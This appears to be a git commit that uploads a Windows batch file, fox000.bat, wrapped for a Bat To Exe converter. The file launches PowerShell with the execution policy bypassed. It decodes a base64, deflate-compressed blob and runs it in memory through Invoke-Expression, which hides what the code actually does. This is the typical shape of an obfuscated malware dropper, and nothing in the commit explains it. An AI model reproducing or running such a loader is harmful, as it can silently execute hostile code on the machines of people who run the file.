30227c9aaf902614ccc1ec65fc025e378bf2c5cb
subitsolutions <137326031+subitsolutions@users.noreply.github.com>
2023-08-21 21:19:11 +0600

    Add files via upload

---
+++ fox000.bat
@@ -0,0 +1,35 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF65
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFAhVVh6DAES0A5EO4f7+086CsUYJW/IDbIrIzufAJfgWig==
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoLogo -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPvT9swEP2ev+IURSJRkygtBXVFSPxSN6StQxRtH6p+SN2Dejh2ZF/aBtb/fRdIt4HYNO1D9Bz77r3nu3Mg4BhOfG96odRlURpLoX+PVqPa76ULpfxoBmU1V1KAo5wYcEN8DpearsjCF2mpytWpUkaE7d46hkpqgk2LdYsP0dF/65xbzAlvlgyLnU7V8q5i+KXcrn7Tbncadf/EI1s/Bo4vPcZ18nn+DQXBpHaERTpGSidG3CO5FiGcvnF2ulhYdG6UF1LVs+GQBdBywNrY+xjeynjGm7pEDp8QX6J4O/DKGjLCqDb0RpSRF7j03GjNRsO97rte2j0c8Jel3d5gL4ZBNsgi+A6mokRXSh1BUPLtpqfW5o2558Jdaq6qFhj685rQj6EfceCGA5n9GgXKFYZB+Yrogc8zL6j/gW96JoldrtByLRrnhquy32POOIs6B41aPc1mDeHmbOStl1IhhKyQKPp7cgSPjZPOS6t1HDx0DuJu/Odyj1R+55htbDRGsPVujWVFedxlL5J1EfrNqtNhBTYXyMbdju6Vo/dIZ3xRF055qGZs5EOuFwojzkq6s60XEOfyXCRN4yApsJijvcBbqSVJoyEQkIzzAsH/KvV+z4dE858rc4HwtDOqtGgiHSRl7hwtbdU06Dig4fDFG8vioE4/or6jZZxt9rMsY+hnkbdzfl1pkgWmT1NpygnalRTo0k+5dctcNS00Zd1UEDLu2/PrmIXBJt2VPYpi+CnC80e7rrfPjxXjYBM38Gr0JpRbSiYKsYRkgsLoBQwO+1m2FTmJ5eP2Bw==\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"
